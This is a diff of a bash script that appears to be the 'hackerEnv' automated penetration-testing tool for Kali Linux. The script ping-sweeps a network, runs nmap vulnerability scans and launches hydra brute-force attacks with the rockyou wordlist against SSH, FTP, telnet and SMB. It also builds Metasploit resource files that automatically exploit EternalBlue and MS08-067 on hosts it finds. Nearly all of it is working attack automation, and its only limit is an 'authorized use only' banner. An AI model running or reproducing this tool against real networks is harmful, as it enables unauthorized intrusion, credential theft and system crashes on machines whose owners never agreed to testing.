@@ -1,4 +1,12 @@
 #!/bin/bash
+#####################################################################################
+#This program works in Kali Linux ONLY and must be root.                            #
+#By running this program, you are agreeing on NOT running it aginst any public,     #
+#corporate or unauthorized networks.                                                #
+#Performed only when you have authorization to do.                                  #
+#This tool can be found at: https://github.com/abdulr7mann                          #
+#Add our hackerEnv.com community server on discord: https://discord.gg/sB5ruJ6      #
+#####################################################################################
 function cleanning(){
 if [ -f $(dirname $0)/online.txt ] && [ -f $(dirname $0)/online.txt ]
 then
@@ -78,7 +86,7 @@ function sshBruteForce(){
 		tmux new-window -n sshBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ssh://$ips -o $ips/sshPassword.txt; read; bash'" \; 2> /dev/null
 		sleep 10
 	fi
-	sed '1d' $ips/sshPassword.txt| cut -f6- -d' ' > $ips/sshPass.txt
+	grep "\[" $ips/sshPassword.txt > $ips/sshPass.txt
 	while read pass
 	do
 		if [ "$pass" != "" ]
@@ -88,7 +96,7 @@ function sshBruteForce(){
 			references="https://www.howtogeek.com/195430/how-to-create-a-strong-password-and-remember-it/"
 			report2
 		fi
-	done < $ips/ftpPass.txt
+	done < $ips/sshPass.txt
 }
 function ftpBruteForce(){
 	echo -e "\e[1;34mChecking\e[0m if \e[1m$ips\e[1m has \e[1mweak passwords\e[0m against \e[1;91mFTP\e[0m"
@@ -104,7 +112,7 @@ function ftpBruteForce(){
 		tmux new-window -n ftpBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ftp://$ips -o $ips/ftpPassword.txt; read; bash'" \; 2> /dev/null
 		sleep 10
 	fi
-	sed '1d' $ips/ftpPassword.txt| cut -f6- -d' ' > $ips/ftpPass.txt
+	grep "\[" $ips/ftpPassword.txt > $ips/ftpPass.txt
 	while read pass
 	do
 		if [ "$pass" != "" ]
@@ -130,7 +138,7 @@ function telnetBruteForce(){
 		tmux new-window -n telnetBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt telnet://$ips -o $ips/telnetPassword.txt; read; bash'" \; 2> /dev/null
 		sleep 10
 	fi
-	sed '1d' $ips/telnetPassword.txt| cut -f6- -d' ' > $ips/telnetPass.txt
+	grep "\[" $ips/telnetPassword.txt > $ips/telnetPass.txt
 	while read pass
 	do
 		if [ "$pass" != "" ]
@@ -156,7 +164,7 @@ function smbBruteForce(){
 		tmux new-window -n smbBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt smb://$ips -o $ips/smbPassword.txt; read; bash'" \; 2> /dev/null
 		sleep 10
 	fi
-	sed '1d' $ips/smbPassword.txt| cut -f6- -d' ' > $ips/smbPass.txt
+	grep "\[" $ips/smbPassword.txt > $ips/smbPass.txt
 	while read pass
 	do
 		if [ "$pass" != "" ]
@@ -253,7 +261,7 @@ function usermap_script(){
 	fi
 	description="This bug was originally reported against the anonymous calls
 to the SamrChangePassword() MS-RPC function in combination
-with the "username map script" smb.conf option (which is not
+with the 'username map script' smb.conf option (which is not
 enabled by default).
 
 After further investigation by Samba developers, it was
@@ -261,7 +269,7 @@ determined that the problem was much broader and impacts
 remote printer and file share management as well.  The root
 cause is passing unfiltered user input provided via MS-RPC
 calls to /bin/sh when invoking externals scripts defined
-in smb.conf.  However, unlike the "username map script"
+in smb.conf.  However, unlike the 'username map script'
 vulnerability, the remote file and printer management scripts
 require an authenticated user session."
 	remediation="Upgrading to the latest version"
@@ -269,9 +277,20 @@ require an authenticated user session."
 	report2
 }
 function ms17_010_eternalblue(){
-	echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow\e[0m"
-	echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
-	cat <<- ms17_010_eternalblue > $(dirname $0)/exploit/windows/smb/ms17_010_eternalblue.rc
+	if [ "$smbVersion" != "" ]
+	then
+		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow/remote code execution\e[0m"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+	elif [ "$smbVersion" = "" ]
+	then
+		smbVersion=$(grep -oP 'key="title">\K[^<]+' $ips/nmapSMBVuln.xml|cut -f6-7 -d' ')
+		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow/remote code execution\e[0m"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+	else
+		echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow\e[0m"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+	fi
+	cat <<- ms17_010_eternalblue > $(dirname $0)/exploits/smb/ms17_010_eternalblue.rc
 		use exploit/windows/smb/ms17_010_eternalblue
 		set RHOSTS $ips
 		set LHOST $ip
@@ -280,10 +299,10 @@ function ms17_010_eternalblue(){
 	sleep 40
 	if [ "$tmux" = "bash" ]
 	then
-		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploit/windows/smb/ms17_010_eternalblue.rc; bash'" 2> /dev/null
+		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_eternalblue.rc; bash'" 2> /dev/null
 		sleep 30
 	else
-		tmux new-window -n eternalblue "bash -c 'msfconsole -r $(dirname $0)/exploit/windows/smb/ms17_010_eternalblue.rc; read; bash'" \; 2> /dev/null
+		tmux new-window -n eternalblue "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_eternalblue.rc; read; bash'" \; 2> /dev/null
 		sleep 30
 	fi
 	description="There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads."
@@ -292,8 +311,19 @@ function ms17_010_eternalblue(){
 	report2
 }
 function ms08_067_netapi(){
-	echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mparsing flaw\e[0m"
-	echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+	if [ "$smbVersion" != "" ]
+	then
+		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mparsing flaw\e[0m"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+	elif [ "$smbVersion" = "" ]
+	then
+		smbVersion=$(grep -oP 'key="title">\K[^<]+' $ips/nmapSMBVuln.xml|cut -f6-7 -d' ')
+		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mparsing flaw\e[0m"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+	else
+		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mparsing flaw\e[0m"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+	fi
 	cat <<- ms08_067_netapi > $(dirname $0)/exploits/smb/ms08_067_netapi.rc
 		use exploit/windows/smb/ms08_067_netapi
 		set RHOSTS $ips
@@ -334,12 +364,12 @@ function smbScan(){
 	nmap -v0 --script vuln -p139,445 $ips -Pn -oA $ips/nmapSMBVuln
 	smbvulnID=$(cat $ips/nmapSMBVuln.xml | grep -oP '\"title">\K[^\<]+'|grep -oP '\(\K[^\)]+'> $ips/nmapSMBVuln.txt)
 	nmap -v0 --script smb-os-discovery.nse -p139,445 $ips -Pn -n -oA $ips/smbOS
-	smbOS=$(cat $ips/smbOS.xml | grep -oP 'output="\K[^"]+')
+	smbOS=$(cat $ips/smbOS.xml | grep -oP 'key="os">\K[^<]+')
 	sleep 30
 }
 ##################   rpcbind       ###############################################################
 function smbclient(){
-	tmux new-window -n smbclient "bash -c 'smbclient --list=$ips; read; bash'" \; 2> /dev/null
+	tmux new-window -n smbclient "bash -c 'smbclient -L //$ips -N; read; bash'" \; 2> /dev/null
 }
 ################################ REPORT GENERATION ######################
 function report(){
@@ -347,7 +377,7 @@ function report(){
 		<!DOCTYPE html>
 		<html class="html">
 		<title>
-		REPORT Tue 07 Jan 2020 04:49:41 PM EST
+		REPORT
 		</title>
 		<head>
 		<meta name="viewport" content="width=device-width, initial-scale=1">
@@ -424,17 +454,12 @@ function report3(){
 	echo "Report was generated => $(pwd=$(pwd); echo "file://$pwd/report.html")"
 }
 ############################### Program starts here #####################
-cat <<banner
-#####################################################################################
-#This program works in Kali Linux ONLY and must be root.                            #
-#By running this program, you are agreeing on NOT running it aginst any public,     #
-#corporate or unauthorized networks.                                                #
-#Performed only when you have authorization to do.                                  #
-#This tool can be found at: https://github.com/abdulr7mann                          #
-#Add our hackerEnv.com community server on discord: https://discord.gg/sB5ruJ6      #
-#####################################################################################
-
-banner
+if ! command -v figlet 2> /dev/null 1> /dev/null
+then
+	apt install figlet -y 2> /dev/null 1> /dev/null
+else
+	figlet -t -f slant "hackerEnv"
+fi
 cleanning
 report
 if [ "$TMUX" = "" ]
@@ -444,7 +469,7 @@ else
 	tmux rename-session Pentesting
 	tmux rename-window -t 0 hackerEnv
 fi
-while getopts 'ht:i:a:s:' OPTION; do
+while getopts 'ht:i:a:s:e' OPTION; do
   case "$OPTION" in
   	h)
       echo "Usage:"
@@ -455,6 +480,7 @@ while getopts 'ht:i:a:s:' OPTION; do
       echo "    $(basename $0) -i <eth0>      To specify an interface."
       echo "    $(basename $0) -a <ip>        Pass attacker's IP."
       echo "    $(basename $0) -s </24>       To specify subNetwork 10.10.10.10/24 or /23 etc."
+      echo "    $(basename $0) -e		Enable aggressive port scan"
       exit 0;;
     t)
       target="$OPTARG";;
@@ -464,6 +490,8 @@ while getopts 'ht:i:a:s:' OPTION; do
       attacker="$OPTARG";;
     s)
       subNetwork="$OPTARG";;
+    e)
+      aggressive=true;;
  	\?)
      echo "Invalid Option: -$OPTION" 1>&2
      echo "For usage info: $(basename $0) -h" 1>&2
@@ -473,32 +501,39 @@ done
 shift "$(($OPTIND -1))"
 ip a |grep -oP 'inet \K[^ ]+'| cut -f1-1 -d"/"|sed -n '2{p;q}' > $(dirname $0)/urIp.txt
 ip="$(cat $(dirname $0)/urIp.txt)"
-if [ "$subNetwork" != "" ] && [ "$interface" != "" ]
-then
-	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
-	ip="$(cat $(dirname $0)/urIp.txt)"
-	fping -a -g $ip$subNetwork 2> /dev/null > $(dirname $0)/online.txt
-elif [ "$subNetwork" != "" ] && [ "$attacker" != "" ]
-then
-	ip="$(cat $(dirname $0)/urIp.txt)"
-	fping -a -g $attacker$subNetwork 2> /dev/null > $(dirname $0)/online.txt
-fi
-if [ "$interface" != "" ]
-then
-	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
-	ip="$(cat $(dirname $0)/urIp.txt)"
-	fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
-elif [ "$target" != "" ]
+if [ "$target" != "" ] && [ "$attacker" != "" ]
 then
 	echo -e "$target" > $(dirname $0)/online.txt
 	ips="$(cat $(dirname $0)/online.txt)"
-elif [ "$attacker" != "" ]
-then
-	fping -a -g $attacker/24 2> /dev/null > $(dirname $0)/online.txt
-	ips="$(cat $(dirname $0)/online.txt)"
+	echo -e "$attacker" > $(dirname $0)/urIp.txt
+	ip="$(cat $(dirname $0)/urIp.txt)"
 else
-	fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
-	ips="$(cat $(dirname $0)/online.txt)"
+	if [ "$subNetwork" != "" ] && [ "$interface" != "" ]
+	then
+		ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
+		ip="$(cat $(dirname $0)/urIp.txt)"
+		fping -a -g $ip$subNetwork 2> /dev/null > $(dirname $0)/online.txt
+	elif [ "$subNetwork" != "" ] && [ "$attacker" != "" ]
+	then
+		ip="$(cat $(dirname $0)/urIp.txt)"
+		fping -a -g $attacker$subNetwork 2> /dev/null > $(dirname $0)/online.txt
+	elif [ "$interface" != "" ]
+	then
+		ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
+		ip="$(cat $(dirname $0)/urIp.txt)"
+		fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
+	elif [ "$target" != "" ]
+	then
+		echo -e "$target" > $(dirname $0)/online.txt
+		ips="$(cat $(dirname $0)/online.txt)"
+	elif [ "$attacker" != "" ]
+	then
+		fping -a -g $attacker/24 2> /dev/null > $(dirname $0)/online.txt
+		ips="$(cat $(dirname $0)/online.txt)"
+	else
+		fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
+		ips="$(cat $(dirname $0)/online.txt)"
+	fi
 fi
 echo "Performing a ping sweep is in process"
 echo -e "Your ip address is \e[1m$ip\e[0m"
@@ -524,8 +559,12 @@ do
 	fi
 	mkdir $ips
 	echo -e "Performing port scan on \e[1m$ips\e[0m"
-#	nmap -v0 -sV -n -Pn -p- -T4 -A -O --open -oA $ips/$ips $ips #1> /dev/null 2> /dev/null
-	nmap -v0 -Pn -n -sV -T4 -A -O -oA "$ips"/"$ips" "$ips" #1> /dev/null
+	if [ "$aggressive" == true ]
+	then
+		nmap -v0 -sV -n -Pn -p- -T4 -A -O --open -oA "$ips"/"$ips" $ips 1> /dev/null
+	else
+		nmap -v0 -Pn -n -sV -T4 -A -O -oA "$ips"/"$ips" $ips 1> /dev/null
+	fi
 	grep "open" $ips/$ips.nmap |sed '1d'
 
 	cat $ips/$ips.xml | grep -oP 'name="\K[^"]+' > $ips/nameTmp.txt
@@ -541,14 +580,19 @@ do
 	ostype="$(cat $ips/$ips.xml | grep -oP 'osfamily="\K[^"]+' |head -1)"
 	osgen="$(cat $ips/$ips.xml | grep -oP 'osgen="\K[^"]+' | xargs | sed 's/ / or /g')"
 	sleep 10
-	echo -e "OS type: \e[1;34m$ostype $osgen\e[0m"
+	if [ "$(grep "netbios-ssn" $ips/name.txt)" = "netbios-ssn" ]
+	then
+		smbScan
+	fi
+	if [ "$smbOS" != "ERROR: Script execution failed (use -d to debug)" ] && [ "$smbOS" != "" ]
+	then
+		echo -e "OS type: \e[1;34m$smbOS\e[0m"
+	else
+		echo -e "OS type: \e[1;34m$ostype $osgen\e[0m"
+	fi
 	echo -e "Performing vulnerability scan on \e[1m$ips\e[0m"
 	while read name
 	do
-		if [ "$smbOS" != "ERROR: Script execution failed (use -d to debug)" ] && [ "$smbOS" != "" ]
-		then
-			echo "just kidding, OS type: $smbOS"
-		fi
 		while read product
 		do
 			while read version
@@ -1324,7 +1368,7 @@ do
 							then
 								ms17_010_eternalblue
 							fi
-						done <$(dirname $0)/$ips/nmapSMBVuln.txt
+						done <$ips/nmapSMBVuln.txt
 					fi
 				fi
         done <$ips/product.txt
@@ -1342,7 +1386,6 @@ do
 			ftpBruteForce
 		elif [ "$name" = "netbios-ssn" ]
 		then
-			smbScan
 			smbBruteForce
 		fi
     done <$ips/name.txt
